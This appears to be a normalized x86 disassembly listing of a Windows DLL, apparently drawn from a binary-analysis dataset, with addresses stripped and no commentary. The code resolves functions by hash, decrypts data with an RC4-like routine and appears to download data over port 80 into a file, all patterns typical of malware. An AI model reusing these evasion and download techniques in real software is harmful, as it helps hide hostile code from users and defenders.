push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002490
push ebp
mov ebp esp
push 0x1d2
push 0x9f13856a
push 0x8
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100024bc
push ebp
mov ebp esp
push 0x1e5
push 0x1a212962
push 0x8
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002505
push ebp
mov ebp esp
push 0x1d9
push 0x2f5ce027
push 0x8
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10002531
push ebp
mov ebp esp
push ebx
push 0x2f
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn 0x4
push esi
push edi
push 0x1
call sub_1000100c
push 0x19
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x2f
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10002589
push ebp
mov ebp esp
push ebx
push 0x36
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn 0x8
push esi
push edi
push 0x1
call sub_1000100c
push 0x1c
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x36
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_100025e4
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x18 ] ebx
push 0x1d0
push 0x1510002f
push 0x8
push ebx
call sub_10001844
add esp 0x10
push ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
push rw-data
push [ ebp - 0xc ]
call eax
mov esi rw-data
push esi
mov [ ebp - 0x8 ] eax
call sub_10002a96
push eax
push esi
push 0xffffffff
push rw-data
push [ ebp - 0x8 ]
call sub_10002490
add esp 0x18
test eax eax
je r-xdata
mov edi rw-data
push edi
call sub_10002a96
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call sub_100024e5
push [ ebp - 0xc ]
call sub_100024e5
push [ ebp - 0x20 ]
call sub_100024e5
add esp 0xc
cmp [ ebp - 0x14 ] ebx
ja r-xdata
push ebx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20000005
push [ ebp - 0x8 ]
mov [ ebp - 0x24 ] 0x4
mov [ ebp - 0x4 ] ebx
call sub_10002505
add esp 0x14
mov esi eax
cmp [ rw-data ] bl
je r-xdata
push esi
call sub_10002a96
push eax
push esi
push 0x2b
push [ ebp - 0xc ]
call sub_10002467
push edi
call sub_10002a96
push eax
push edi
push 0x2c
push [ ebp - 0xc ]
call sub_10002467
add esp 0x28
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push 0x2710
call sub_10002531
inc [ ebp - 0x18 ]
cmp [ ebp - 0x18 ] 0x1e
jb r-xdata
push r--data
push rw-data
push rw-data
call sub_10002cef
add esp 0xc
mov [ ebp - 0x1c ] eax
cmp esi ebx
je r-xdata
push rw-data
push 0x104
call sub_10002589
push ebx
push ebx
push rw-data
push [ rw-data ]
mov [ ebp - 0x14 ] ebx
push rw-data
call sub_1000243b
push 0x1ce
push 0xbe618d3e
push 0x8
push ebx
mov [ ebp - 0x20 ] eax
call sub_10001844
add esp 0x24
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push [ ebp - 0x20 ]
call eax
mov esi rw-data
push esi
mov [ ebp - 0xc ] eax
call sub_10002a96
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x1c ]
call sub_10001f78
pop ecx
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
push 0x1
push r--data
push eax
call sub_1000350e
add esp 0xc
mov [ ebp - 0x14 ] eax
push [ ebp - 0x4 ]
call sub_10001f60
pop ecx
mov edi eax
xor esi esi
mov [ ebp - 0x10 ] ebx
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
push edi
call sub_10001f78
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
push edi
push [ ebp - 0x1c ]
call sub_1000350e
add esp 0xc
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
lea eax [ esi + edi ]
push eax
push [ ebp - 0x8 ]
call sub_100024bc
add esi [ ebp - 0x10 ]
add esp 0x10
cmp [ ebp - 0x10 ] ebx
je r-xdata
sub_100027e1
push ebp
mov ebp esp
push ebx
push [ ebp + 0x3c ]
xor ebx ebx
push [ ebp + 0x38 ]
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10002063
add esp 0x34
test al al
je r-xdata
mov al bl
pop ebx
pop ebp
retn
push ebx
push sub_100025e4
push [ ebp + 0x8 ]
call sub_10001cfe
add esp 0xc
mov bl al
sub_10002832
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
xor ebx ebx
push edi
mov [ ebp - 0x14 ] ebx
mov esi rw-data
push 0x1d0
push 0x1510002f
push 0x8
push ebx
call sub_10001844
add esp 0x10
push ebx
push ebx
push ebx
push ebx
push ebx
push rw-data
push rw-data
push [ ebp - 0x8 ]
call eax
mov edi rw-data
push edi
mov [ ebp - 0x4 ] eax
call sub_10002a96
push eax
push edi
push 0xffffffff
push rw-data
push [ ebp - 0x4 ]
call sub_10002490
add esp 0x18
test eax eax
je r-xdata
mov edi rw-data
push edi
call sub_10002a96
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_100024e5
push [ ebp - 0x8 ]
call sub_100024e5
push [ ebp - 0x18 ]
call sub_100024e5
add esp 0xc
cmp [ ebp - 0x10 ] ebx
ja r-xdata
push ebx
lea eax [ ebp - 0xc ]
push eax
push ebx
push 0x16
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] ebx
call sub_10002505
add esp 0x14
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
push esi
call sub_10002a96
push eax
push esi
push 0x2b
push [ ebp - 0x8 ]
call sub_10002467
push edi
call sub_10002a96
push eax
push edi
push 0x2c
push [ ebp - 0x8 ]
call sub_10002467
add esp 0x28
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] 0x1e
jb r-xdata
push [ ebp - 0xc ]
call sub_10001f60
mov edi eax
push ebx
lea eax [ ebp - 0xc ]
push eax
push edi
push 0x13
push [ ebp - 0x4 ]
call sub_10002505
push 0x3
push r--data
push edi
call sub_10001d5e
add esp 0x24
test eax eax
je r-xdata
push ebx
push ebx
push rw-data
push [ rw-data ]
mov [ ebp - 0x10 ] ebx
push rw-data
call sub_1000243b
push 0x1ce
push 0xbe618d3e
push 0x8
push ebx
mov [ ebp - 0x18 ] eax
call sub_10001844
add esp 0x24
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x50
push rw-data
push [ ebp - 0x18 ]
call eax
push esi
mov [ ebp - 0x8 ] eax
call sub_10002a96
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x10 ] 0x1
push 0x3
push r--data
push edi
call sub_10001d5e
add esp 0xc
mov [ ebp - 0x10 ] ebx
test eax eax
jne r-xdata
push r--data
push rw-data
push rw-data
call sub_10002cef
add esp 0xc
mov edi eax
push 0x1
cmp [ ebp - 0x10 ] ebx
je r-xdata
push rw-data
push 0x104
call sub_10002589
push edi
call sub_10001f78
pop ecx
cmp [ rw-data ] bl
je r-xdata
push r--data
push r--data
jmp r-xdata
push edi
call sub_1000350e
add esp 0xc
push edi
mov [ ebp - 0x10 ] eax
call sub_10001f78
pop ecx
sub_10002a25
push ebp
mov ebp esp
push ebx
push [ ebp + 0x3c ]
xor ebx ebx
push [ ebp + 0x38 ]
push [ ebp + 0x34 ]
push [ ebp + 0x30 ]
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000224f
add esp 0x34
test al al
je r-xdata
mov al bl
pop ebx
pop ebp
retn
push ebx
push sub_10002832
push [ ebp + 0x8 ]
call sub_10001cfe
add esp 0xc
mov bl al
sub_10002a76
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10002008
pop ecx
sub_10002a96
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
cmp [ ecx ] 0x0
mov eax ecx
je r-xdata
xor eax eax
pop ebp
retn
sub eax ecx
pop ebp
retn
inc eax
cmp [ eax ] 0x0
jne r-xdata
sub_10002ab5
push ebp
mov ebp esp
sub esp 0x10c
push ebx
push esi
push edi
xor ebx ebx
push 0xff
lea eax [ ebp - 0x10b ]
push ebx
push eax
mov [ ebp - 0x10c ] bl
call sub_100042df
push 0x34
mov [ ebp - 0x1 ] bl
call sub_10001f60
push 0x32
push [ ebp + 0x10 ]
mov esi eax
push esi
call sub_10001d11
mov eax [ ebp + 0xc ]
add esp 0x1c
add eax [ ebp + 0x8 ]
mov cl [ eax - 0x2 ]
mov [ esi + 0x32 ] cl
mov al [ eax - 0x1 ]
mov [ esi + 0x33 ] al
movzx eax [ ebp - 0x1 ]
mov cl [ ebp - 0x1 ]
inc [ ebp - 0x1 ]
mov [ ebp + eax - 0x10c ] cl
jne r-xdata
xor edi edi
inc [ ebp - 0x1 ]
movzx edi al
lea eax [ ebp + edi - 0x10c ]
mov bl [ eax ]
mov [ ecx ] bl
mov [ eax ] dl
jne r-xdata
dec eax
or eax 0xffffff00
inc eax
movzx eax [ ebp - 0x1 ]
lea ecx [ ebp + eax - 0x10c ]
cdq
push 0x34
pop ebx
idiv ebx
movzx eax [ edx + esi ]
mov dl [ ecx ]
movzx ebx dl
add eax edi
add eax ebx
and eax 0x800000ff
jns r-xdata
push esi
call sub_10001f78
cmp [ ebp + 0x14 ] 0x0
mov esi [ ebp + 0xc ]
pop ecx
je r-xdata
lea eax [ esi - 0x1 ]
push eax
push esi
jmp r-xdata
movzx edx cl
lea esi [ ebp + edx - 0x10c ]
movzx ecx [ esi ]
add ecx edi
and ecx 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
call sub_10001f60
pop ecx
mov ecx [ ebp + 0x8 ]
sub ecx eax
xor edx edx
xor edi edi
add esi 0xfffffffe
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] ecx
mov [ ebp + 0x8 ] esi
movzx edi cl
lea ecx [ ebp + edi - 0x10c ]
mov bl [ ecx ]
mov [ ebp + 0x17 ] bl
mov bl [ esi ]
mov [ ecx ] bl
mov bl [ ebp + 0x17 ]
mov [ esi ] bl
movzx ecx [ ecx ]
movzx esi bl
add esi ecx
and esi 0x800000ff
jns r-xdata
dec ecx
or ecx 0xffffff00
inc ecx
mov cl [ ebp + esi - 0x10c ]
mov esi [ ebp - 0xc ]
xor cl [ esi + eax ]
mov [ eax ] cl
inc eax
dec [ ebp + 0x8 ]
jne r-xdata
dec esi
or esi 0xffffff00
inc esi
lea ecx [ edx + 0x1 ]
and ecx 0x800000ff
jns r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + ecx - 0x2 ] 0x0
pop ebx
leave
retn
sub_10002c16
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
xor eax eax
test edx edx
je r-xdata
pop ebp
retn
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
imul eax eax 0xa
movsx ecx cl
lea eax [ eax + ecx - 0x30 ]
inc edx
sub_10002c37
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl [ ebp + 0xc ]
je r-xdata
pop ebp
retn
inc eax
sub_10002c53
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
xor al al
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
push edx
call sub_10002a96
push esi
mov edi eax
call sub_10002a96
pop ecx
pop ecx
cmp edi eax
pop edi
jne r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
mov al 0x1
jmp r-xdata
mov eax edx
sub esi edx
pop esi
pop ebp
retn
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl [ esi + eax ]
jne r-xdata
sub_10002c9a
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_10002a96
inc eax
push eax
call sub_10001f60
push [ ebp + 0x8 ]
mov esi eax
call sub_10002a96
push eax
push [ ebp + 0x8 ]
push esi
call sub_10001d11
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_10002cc9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
lea eax [ esi + 0x1 ]
push edi
push eax
call sub_10001f60
push esi
push [ ebp + 0x8 ]
mov edi eax
push edi
call sub_10001d11
add esp 0x10
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10002cef
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_10002a96
pop ecx
test eax eax
je r-xdata
pop esi
leave
retn
push ebx
push edi
xor ebx ebx
mov [ ebp - 0x4 ] 0x1
lea edi [ ebp + 0x8 ]
add edi 0x4
mov esi [ edi ]
push r--data
push esi
call sub_10002c53
pop ecx
pop ecx
test al al
je r-xdata
push esi
call sub_10002a96
add eax [ ebp - 0x4 ]
push eax
push ebx
call sub_10002011
push esi
mov ebx eax
call sub_10002a96
push eax
mov eax [ ebp - 0x4 ]
lea eax [ eax + ebx - 0x1 ]
push esi
push eax
call sub_10001d11
push esi
call sub_10002a96
add esp 0x20
add [ ebp - 0x4 ] eax
test esi esi
je r-xdata
pop edi
mov eax ebx
pop ebx
sub_10002d83
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002d64
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10002008
pop ecx
sub_10002da2
push esi
push edi
mov esi ecx
xor edi edi
mov [ esi ] r--data
cmp [ esi + 0x8 ] edi
jbe r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop edi
mov ecx esi
pop esi
jmp sub_10002d64
push eax
call sub_10001f78
pop ecx
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push [ eax ]
call sub_10001f78
pop ecx
sub_10002deb
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10002da2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10002008
pop ecx
sub_10002e0a
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
test edi edi
je r-xdata
xor al al
push edi
call sub_10002a96
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x4
call sub_10001f60
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
lea eax [ eax * 4 + 0x4 ]
push eax
push ecx
call sub_10002011
pop ecx
jmp r-xdata
pop ecx
push edi
mov [ esi + 0x4 ] eax
call sub_10002a96
inc eax
push eax
call sub_10001f60
push edi
mov [ ebp + 0x8 ] eax
call sub_10002a96
push eax
push edi
push [ ebp + 0x8 ]
call sub_1000428b
mov ecx [ esi + 0x4 ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
lea eax [ ecx + eax * 4 ]
push eax
call sub_1000428b
add esp 0x24
inc [ esi + 0x8 ]
mov al 0x1
jmp r-xdata
sub_10002e94
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
movzx ecx [ edx ]
push edi
xor eax eax
xor edi edi
test cx cx
je r-xdata
or eax 0xffffffff
pop ebp
retn
pop edi
pop ebp
retn
push ebx
push esi
cmp [ ebp + 0x10 ] 0x0
movzx ecx cx
je r-xdata
cmp edi [ ebp + 0xc ]
jae r-xdata
movzx ecx cx
rol eax 0x7
add edx 0x2
xor eax ecx
movzx ecx [ edx ]
inc edi
test cx cx
jne r-xdata
lea ebx [ ecx - 0x41 ]
mov esi ecx
cmp bx 0x19
ja r-xdata
pop esi
pop ebx
cmp [ ebp + 0xc ] 0x0
je r-xdata
movzx ecx si
add ecx 0x20
movzx esi cx
sub_10002ef3
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
push esi
push edi
xor esi esi
xor edi edi
jmp r-xdata
or eax 0xffffffff
pop ebp
retn
mov cl [ edx ]
test cl cl
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp edi [ ebp + 0xc ]
jae r-xdata
movsx eax cl
rol esi 0x7
xor esi eax
inc edx
inc edi
lea eax [ ecx - 0x41 ]
cmp al 0x19
ja r-xdata
add cl 0x20
sub_10002f3b
push ebx
push esi
push edi
mov esi ecx
xor ebx ebx
xor edi edi
cmp [ esi + 0x8 ] ebx
jbe r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop esi
mov al 0x1
pop ebx
retn
push eax
call sub_10001f78
pop ecx
mov eax [ esi + 0x4 ]
lea eax [ eax + edi * 4 ]
cmp [ eax ] ebx
je r-xdata
push [ eax ]
call sub_10001f78
pop ecx
inc edi
cmp edi [ esi + 0x8 ]
jb r-xdata
push [ eax ]
call sub_10001f78
pop ecx
sub_10002fb8
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
push 0x4
call sub_10001f60
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
lea eax [ eax * 4 + 0x4 ]
push eax
push ecx
call sub_10002011
pop ecx
jmp r-xdata
mov [ esi + 0x4 ] eax
pop ecx
mov ecx [ esi + 0x4 ]
push 0x4
lea eax [ ebp + 0x8 ]
push eax
mov eax [ esi + 0x8 ]
lea eax [ ecx + eax * 4 ]
push eax
call sub_10001d11
add esp 0xc
inc [ esi + 0x8 ]
mov al 0x1
pop esi
pop ebp
retn 0x4
sub_1000300a
push ebp
mov ebp esp
push 0x89
push 0x32432444
push 0x1
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_1000304d
push ebp
mov ebp esp
push 0x25
push 0xaef7cbf1
push 0x1
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10003082
push ebp
mov ebp esp
push 0x8b
push 0x279dead7
push 0x1
push 0x0
call sub_10001844
add esp 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_100030c2
push ebp
mov ebp esp
push ebx
push 0x14
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn 0x1c
push esi
push edi
push 0x1
call sub_1000100c
push 0x14
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x14
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_1000312c
push ebp
mov ebp esp
push ebx
push 0x16
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn 0x14
push esi
push edi
push 0x1
call sub_1000100c
push 0xd
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x16
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10003190
push ebp
mov ebp esp
push ebx
push 0x1a
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn 0x14
push esi
push edi
push 0x1
call sub_1000100c
push 0xe
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x1a
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_100031f4
push ebp
mov ebp esp
push ebx
push 0x56
call sub_10001634
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
pop ebx
pop ebp
retn
push esi
push edi
push 0x1
call sub_1000100c
push 0x15
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
push ebx
push 0x56
call sub_10001650
add esp 0x24
pop edi
pop esi
sub_10003250
push ebp
mov ebp esp
push ecx
push esi
mov esi 0x1a2
push esi
call sub_10001634
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ ebp - 0x4 ]
pop esi
leave
retn
push ebx
push edi
push 0x5
call sub_1000100c
push 0x6f
mov edi eax
call sub_10001194
push edi
mov ebx eax
call sub_10001876
push ebx
push eax
call sub_10001673
push edi
mov [ ebp - 0x4 ] eax
call sub_10001f78
push ebx
call sub_10001f78
push [ ebp - 0x4 ]
push esi
call sub_10001650
add esp 0x24
pop edi
pop ebx
sub_100032b8
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
xor eax eax
mov [ ebp - 0x10 ] bl
lea edi [ ebp - 0xf ]
stosd [ edi ]
stosb [ edi ]
mov [ ebp - 0x18 ] bl
xor eax eax
lea edi [ ebp - 0x17 ]
stosd [ edi ]
push ebx
stosb [ edi ]
mov esi r--data
push esi
mov edi r--data
push edi
call sub_10002a96
pop ecx
push eax
push edi
call sub_10002ab5
add esp 0x10
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x8 ] eax
call sub_10002a96
pop ecx
push eax
push edi
call sub_10002ab5
mov edi eax
push 0x6
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
call sub_100031f4
push 0x6
lea eax [ ebp - 0x18 ]
push eax
push edi
call sub_100031f4
push [ ebp - 0x8 ]
call sub_10001f78
push edi
call sub_10001f78
add esp 0x30
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x1 ] bl
call sub_10002a96
pop ecx
push eax
push edi
call sub_10002ab5
add esp 0x10
push ebx
push esi
mov edi r--data
push edi
mov [ ebp - 0x8 ] eax
call sub_10002a96
pop ecx
push eax
push edi
call sub_10002ab5
add esp 0x10
push ebx
push esi
mov esi r--data
push esi
mov edi eax
call sub_10002a96
pop ecx
push eax
push esi
call sub_10002ab5
push [ ebp - 0x8 ]
mov esi eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10002c53
add esp 0x18
test al al
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
je r-xdata
push [ ebp - 0x8 ]
call sub_10001f78
push edi
call sub_10001f78
push esi
call sub_10001f78
mov al [ ebp - 0x1 ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x18 ]
push edi
push eax
call sub_10002c53
pop ecx
pop ecx
test al al
je r-xdata
sub_10003404
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
call sub_100032b8
test al al
je r-xdata
xor al al
leave
retn
push ebx
push esi
push edi
push 0x1
call sub_1000100c
push 0xc
mov esi eax
call sub_10001194
push esi
mov edi eax
call sub_10001876
push edi
push eax
call sub_10001673
push esi
mov ebx eax
call sub_10001f78
push edi
call sub_10001f78
xor esi esi
add esp 0x1c
cmp ebx esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
call ebx
test al al
jne r-xdata
xor al al
jmp r-xdata
xor eax eax
cmp [ ebp - 0x4 ] esi
sete al
mov [ ebp - 0x4 ] esi
pop edi
pop esi
pop ebx
leave
retn
sub_10003478
push ebp
mov ebp esp
push esi
push edi
mov esi 0x8000
xor eax eax
push 0x0
push esi
push edi
push [ ebp + 0x8 ]
call sub_10003250
add esp 0x10
cmp eax 0xc0000004
jne r-xdata
test eax eax
jne r-xdata
push edi
call sub_10001f78
pop ecx
add esi esi
jmp r-xdata
push edi
call sub_10001f78
pop ecx
mov eax edi
jmp r-xdata
push esi
call sub_10001f60
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
sub_100034c5
push ebp
mov ebp esp
sub esp 0x140
and [ ebp - 0x140 ] 0x0
push 0x13c
lea eax [ ebp - 0x13c ]
push 0x0
push eax
call sub_100042df
lea eax [ ebp - 0x140 ]
push eax
push [ ebp + 0x8 ]
call sub_1000300a
add esp 0x14
cmp eax 0xffffffff
je r-xdata
xor al al
leave
retn
push eax
call sub_1000302d
pop ecx
mov al 0x1
leave
retn
sub_1000350e
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
push edi
push esi
push 0x80
push 0x2
push esi
push 0x1
push 0x40000000
push [ ebp + 0x8 ]
call sub_100030c2
mov edi eax
cmp edi 0xffffffff
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp [ ebp + 0xc ] esi
je r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
push edi
call sub_10001939
mov eax [ ebp + 0x8 ]
pop ecx
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
push esi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_1000312c
sub_1000356d
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
cmp [ ebp + 0x8 ] edi
jne r-xdata
push edi
push edi
push 0x3
push edi
push edi
push 0x80000000
push [ ebp + 0x8 ]
call sub_100030c2
mov [ ebp + 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
xor eax eax
jmp r-xdata
push esi
push edi
push eax
call sub_1000304d
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call sub_10001f60
add esp 0xc
mov [ ebp + 0xc ] eax
cmp eax edi
je r-xdata
pop edi
pop ebx
pop ebp
retn
push [ ebp + 0x8 ]
call sub_10001939
cmp esi [ ebx ]
pop ecx
pop esi
je r-xdata
cmp esi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] edi
jmp r-xdata
push edi
push ebx
push esi
push eax
push [ ebp + 0x8 ]
call sub_10003190
sub_100035e3
push esi
push edi
xor edi edi
mov esi rw-data
call sub_1000306d
push edi
mov [ esi ] eax
call sub_10002531
add esi 0x4
add edi 0x3
cmp esi rw-data
jl r-xdata
pop edi
pop esi
retn
sub_1000360a
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push ebx
push esi
push edi
lea esi [ eax * 4 + rw-data ]
mov ecx [ esi ]
lea edx [ eax - 0x3 ]
and edx 0xf
